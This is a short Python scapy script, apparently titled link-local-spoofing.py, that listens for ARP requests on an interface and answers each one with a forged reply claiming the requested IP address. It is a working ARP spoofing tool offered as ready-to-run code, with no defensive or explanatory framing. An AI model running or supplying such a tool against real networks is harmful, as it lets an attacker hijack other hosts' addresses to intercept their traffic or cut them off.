import scapy.all as scapy
import time
import sys

who= 1
is_at = 2
iface_global = ""
def send_reply(ip,  req_mac, req_ip):
    pkt = scapy.Ether(dst=req_mac)/scapy.ARP(op = is_at, pdst = req_ip, hwdst = req_mac, psrc = ip)
    print(scapy.ls(pkt))
    scapy.sendp(pkt, verbose = True,  iface=iface_global)

def handle_arp_packet(pkt):
    if pkt[scapy.ARP].op == who:
        print('Got ARP request for ',  pkt[scapy.ARP].pdst, "from ", pkt[scapy.Ether].src,  "/",  pkt[scapy.ARP].psrc, " replying saying we do")
        send_reply(pkt[scapy.ARP].pdst,  pkt[scapy.Ether].src, pkt[scapy.ARP].psrc)
    
    return


if len(sys.argv) == 2:
    iface_global = sys.argv[1]
    scapy.sniff(filter="arp", iface=iface_global,  prn=handle_arp_packet)
else:
    print("Usage: link-local-spoofing.py <iface>")
